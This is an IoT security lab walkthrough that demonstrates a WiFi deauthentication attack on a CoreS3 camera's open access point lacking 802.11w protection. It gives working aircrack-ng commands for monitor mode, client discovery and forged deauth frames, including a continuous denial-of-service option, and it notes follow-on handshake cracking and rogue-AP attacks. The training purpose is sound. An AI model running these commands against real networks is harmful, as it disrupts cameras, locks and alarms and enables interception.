# L23: WiFi Deauthentication Attack

## Goal
Perform a WiFi deauthentication attack against the CoreS3 access point to disconnect clients and demonstrate the lack of 802.11w Protected Management Frames (PMF).

## Background

**Why this matters**: 802.11 management frames (deauth, disassociation) are sent unencrypted and unauthenticated without 802.11w PMF. An attacker can forge deauth frames to disconnect any client from an AP - no credentials needed, just radio range.

**What you're looking for in IoT devices:**
- Access points without 802.11w PMF enabled
- Open networks where all management frames are unprotected
- Devices that fail ungracefully when WiFi is disrupted (crash, lose state, expose debug info)
- Safety-critical devices (cameras, locks, alarms) that depend on WiFi availability

**Why this happens:**
- 802.11w is optional in WPA2 and rarely enabled on IoT APs
- ESP32 softAP mode does not enforce PMF by default
- The 802.11 standard sends management frames in plaintext by design
- WPA3 mandates PMF, but WPA3 adoption in IoT remains low

**On CoreS3**: The device runs as an open WiFi AP (`CoreS3-CAM-XXXX`) with no encryption and no PMF. The firmware uses `WiFi.softAP()` without configuring security parameters. Any device within radio range can send forged deauth frames to disconnect clients.

**802.11 Management Frame Basics:**

```
Management Frame Types (relevant to this attack):
- Deauthentication (0x0C): Terminates an existing connection
- Disassociation (0x0A): Releases an association
- Beacon (0x08): AP announces its presence
- Probe Request/Response (0x04/0x05): Client discovers APs
- Authentication (0x0B): Initial authentication exchange
- Association Request/Response (0x00/0x01): Join the network

Deauthentication frame structure:
+----------+----------+----------+--------+--------+
| Frame    | Duration | Dest     | Source | BSSID  |
| Control  | /ID      | Address  | Addr   |        |
| (2 bytes)| (2 bytes)| (6 bytes)| (6)    | (6)    |
+----------+----------+----------+--------+--------+
| Seq      | Reason   | FCS      |
| Control  | Code     |          |
| (2 bytes)| (2 bytes)| (4 bytes)|
+----------+----------+----------+

Common reason codes:
- 1: Unspecified reason
- 2: Previous auth no longer valid
- 3: Station is leaving (deauthentication)
- 7: Class 3 frame received from non-associated station
```

**Why PMF (802.11w) prevents this:**

With PMF enabled, deauth and disassociation frames include a Message Integrity Check (MIC). Forged frames without valid MIC are dropped. The attacker cannot forge a valid MIC without the session key. WPA3 mandates PMF; WPA2 supports it optionally.

## Hardware Setup

**What you need:**
- CoreS3 device running as WiFi AP
- WiFi adapter capable of monitor mode and packet injection (e.g., Alfa AWUS036ACH, TP-Link TL-WN722N v1, Panda PAU09)
- A client connected to the CoreS3 AP (laptop, phone, or second computer)
- Linux machine with `aircrack-ng` suite installed
- Optional: Wireshark for packet analysis

**Supported chipsets for monitor mode + injection:**
- **Realtek RTL8812AU** (Alfa AWUS036ACH) - 802.11ac, well-supported
- **Atheros AR9271** (TP-Link TL-WN722N v1 only) - 802.11n, excellent Linux support
- **Ralink RT5572** (Panda PAU09) - dual-band, good injection support
- **Note:** Internal laptop WiFi cards usually do NOT support injection

**Installing aircrack-ng:**
```bash
# Debian/Ubuntu
sudo apt update && sudo apt install -y aircrack-ng

# Fedora/RHEL
sudo dnf install aircrack-ng

# Arch Linux
sudo pacman -S aircrack-ng
```

## Lab Walkthrough

### Step 1: Confirm the Target AP Configuration

Identify the CoreS3 BSSID, channel, and confirm PMF is disabled.

```bash
# Scan for the device AP
sudo iwlist wlan0 scanning | grep -A 10 "CoreS3-CAM"

# Expected output (partial):
#   Cell 03 - Address: XX:XX:XX:XX:XX:XX
#             Channel:1
#             ESSID:"CoreS3-CAM-26EEFC"
#             Encryption key:off
```

`Encryption key:off` confirms an open network with zero management frame protection. Channel 1 is the default for ESP32 softAP.

### Step 2: Connect a Client to the Target AP

Connect a device to the CoreS3 AP so there is a client to deauthenticate.

```bash
# Connect a USB WiFi adapter (separate from your attack adapter)
nmcli device wifi connect "CoreS3-CAM-26EEFC" ifname wlan0

# Or use wpa_supplicant for an open network
sudo wpa_supplicant -B -i wlan0 -c <(echo 'network={ssid="CoreS3-CAM-26EEFC" key_mgmt=NONE}')
sudo dhclient wlan0

# Verify connection
ping -c 3 192.168.4.1

# Expected:
# PING 192.168.4.1 (192.168.4.1) 56(84) bytes of data.
# 64 bytes from 192.168.4.1: icmp_seq=1 ttl=255 time=2.34 ms
# ...

# Verify the camera web interface is accessible
curl -s http://192.168.4.1/ | head -5
```

### Step 3: Enable Monitor Mode on Attack Adapter

Put your attack WiFi adapter into monitor mode to send and receive raw 802.11 frames.

```bash
# Identify your attack adapter (DIFFERENT from the one connected to the AP)
sudo airmon-ng

# Expected output:
# PHY     Interface  Driver          Chipset
# phy0    wlan0      ath9k_htc       Qualcomm Atheros Communications AR9271
# phy1    wlan1      rtl8812au       Realtek Semiconductor Corp. RTL8812AU

# Kill interfering processes (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan1

# Expected output:
# PHY     Interface  Driver          Chipset
# phy1    wlan1mon   rtl8812au       Realtek Semiconductor Corp. RTL8812AU
#                    (monitor mode vif enabled on [phy1]wlan1mon)

# Verify monitor mode is active
iwconfig wlan1mon

# Expected:
# wlan1mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz

# Set the adapter to the target channel
sudo iwconfig wlan1mon channel 1
```

**Troubleshooting:**
- If `airmon-ng start` fails, try: `sudo ip link set wlan1 down && sudo iw dev wlan1 set type monitor && sudo ip link set wlan1 up`
- Some drivers rename the interface (e.g., `wlan1` becomes `wlan1mon`). Use `iwconfig` to find the new name.
- If you see `Device or resource busy`, run `sudo airmon-ng check kill` first.

### Step 4: Scan for Connected Clients

Use `airodump-ng` to identify connected clients and their MAC addresses.

```bash
# Scan on the AP's channel
# Replace XX:XX:XX:XX:XX:XX with the BSSID from Step 1
sudo airodump-ng -c 1 --bssid XX:XX:XX:XX:XX:XX wlan1mon

# Expected output:
# CH  1 ][ Elapsed: 12 s ][ 2026-03-09 14:30
#
# BSSID              PWR  Beacons  #Data  #/s  CH  MB   ENC   CIPHER AUTH  ESSID
# XX:XX:XX:XX:XX:XX  -30  45       12     1    1   54   OPN              CoreS3-CAM-26EEFC
#
# BSSID              STATION            PWR  Rate  Lost  Frames  Notes  Probes
# XX:XX:XX:XX:XX:XX  YY:YY:YY:YY:YY:YY -40  54-54  0     25
```

- **Top section (APs):** `ENC: OPN` confirms open network.
- **Bottom section (STATIONs):** Note the STATION MAC (`YY:YY:YY:YY:YY:YY`) - the target client.
- **PWR:** Signal strength in dBm (closer to 0 = stronger).

Press `Ctrl+C` once you have the client MAC.

### Step 5: Send Deauthentication Frames

Use `aireplay-ng` to send forged deauth frames.

```bash
# Option A: Deauth ALL clients (broadcast)
# Sends 10 rounds of deauth frames (64 frames per round)
sudo aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan1mon

# Expected output:
# 14:32:05  Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 1
# 14:32:05  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF]
# ...
```

```bash
# Option B: Deauth a SPECIFIC client (more reliable)
sudo aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan1mon

# Expected output:
# 14:32:05  Sending 64 directed DeAuth (code 7). STMAC: [YY:YY:YY:YY:YY:YY]
# ...
```

```bash
# Option C: Continuous deauth (sustained DoS) - Ctrl+C to stop
sudo aireplay-ng -0 0 -a XX:XX:XX:XX:XX:XX wlan1mon
```

Flag reference: `-0` = deauthentication mode, number after `-0` = rounds (0 = infinite), `-a` = target AP BSSID, `-c` = target client MAC.

### Step 6: Observe the Impact

Monitor device and client behavior during and after the attack.

```bash
# Terminal 1: Watch serial console for client disconnect events
pio device monitor -b 115200

# Expected serial output during attack:
# AP Clients: 0
# (After attack stops, client reconnects)
# AP Clients: 1
```

```bash
# Terminal 2: Try accessing the web interface during the attack
curl --connect-timeout 5 http://192.168.4.1/

# Expected: Connection timeout while deauthenticated
# curl: (28) Connection timed out after 5001 milliseconds

curl --connect-timeout 5 http://192.168.4.1/stream?noauth=1
# Expected: Connection timeout - camera feed unavailable
```

```bash
# Terminal 3: Monitor reconnection after stopping the attack (Ctrl+C aireplay-ng)
ping -c 10 192.168.4.1

# Expected: First pings fail, then connectivity restores
# From 192.168.4.100 icmp_seq=1 Destination Host Unreachable
# From 192.168.4.100 icmp_seq=2 Destination Host Unreachable
# 64 bytes from 192.168.4.1: icmp_seq=3 ttl=255 time=4.12 ms   <-- reconnected
```

### Step 7: Analyze with Wireshark (Optional)

Capture deauth frames in Wireshark to examine frame structure.

```bash
# Start Wireshark on the monitor mode interface
wireshark -i wlan1mon -k &

# Display filter for deauth frames:
wlan.fc.type_subtype == 0x000c

# Or capture with tcpdump
sudo tcpdump -i wlan1mon -e -n type mgt subtype deauth

# Expected: Deauth frames with:
# - Source: XX:XX:XX:XX:XX:XX (spoofed AP BSSID)
# - Destination: FF:FF:FF:FF:FF:FF (broadcast) or specific client MAC
# - Reason code: 7
# - No encryption or authentication on the frame
```

### Step 8: Restore Monitor Mode Interface

```bash
# Stop monitor mode
sudo airmon-ng stop wlan1mon

# Restart NetworkManager
sudo systemctl start NetworkManager
```

## Impact

- **Denial of service**: Camera feed and web interface become completely unavailable during the attack.
- **Forced reconnection**: On a WPA2 network, forced reconnection exposes the 4-way handshake for offline cracking.
- **Rogue AP attack chain**: Deauth clients, then present a rogue AP with the same SSID for full MITM.
- **No PMF protection**: Management frames are completely unauthenticated on this device.
- **Low barrier**: Single command, widely available tools, no credentials needed, radio range only (50-100m with directional antenna).
- **Real-world parallel**: WiFi deauth attacks have been used against security cameras, smart locks, alarm systems, and Ring doorbells.

## References

- [IEEE 802.11w - Protected Management Frames](https://en.wikipedia.org/wiki/IEEE_802.11w-2009)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [WiFi Deauthentication Attack](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack)
- [ESP32 WiFi Security Configuration](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-reference/network/esp_wifi.html)
- [aircrack-ng Documentation](https://www.aircrack-ng.org/doku.php)
- [802.11 Frame Types and Subtypes](https://en.wikipedia.org/wiki/802.11_Frame_Types)
